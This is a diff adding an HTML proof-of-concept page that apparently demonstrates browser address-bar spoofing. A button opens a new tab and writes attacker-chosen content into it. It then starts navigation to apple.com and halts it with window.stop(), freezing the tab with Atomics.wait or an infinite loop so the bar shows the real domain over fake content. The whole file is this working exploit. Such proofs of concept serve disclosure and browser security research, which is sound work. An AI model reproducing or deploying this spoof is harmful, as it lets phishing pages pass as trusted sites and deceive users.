@@ -1,0 +1,45 @@
+<h1>Window.stop</h1>
+<br>
+
+<button style="font-size: 30px;" onclick="spoof()">Button</button>
+
+<script>
+    function spoof() {
+        const tab = window.open("about:blank", "_blank");
+
+        if (!tab) return;
+
+        tab.document.write(`
+
+        // Fake content
+
+            <h1 id="content1" style="display: block; font-size: 50px; color: pink; text-align: center; position: fixed; inset: 0; height: fit-content; margin: auto;">Pls visit Google.com</h1>
+            <h1 id="content2" style="display: none; font-size: 50px; color: pink; text-align: center; position: fixed; inset: 0; height: fit-content; margin: auto;">Address spoofed by nakano</h1>
+
+
+            <script>
+                setTimeout(() => {
+                    document.getElementById("content1").style.display = "none"
+                    document.getElementById("content2").style.display = "block"
+                }, 5000);
+
+                setTimeout(() => {
+                    window.location = "https://apple.com";
+                }, 100);
+
+                setTimeout(() => {
+                    window.stop();
+
+                    try {
+                        const sab = new SharedArrayBuffer(4);
+                        const view = new Int32Array(sab);
+
+                        Atomics.wait(view, 0, 0, 9999999);
+                    } catch (e) {
+                        while (true) {}
+                    }
+                }, 700);
+            <\/script>
+        `);
+    }
+</script>
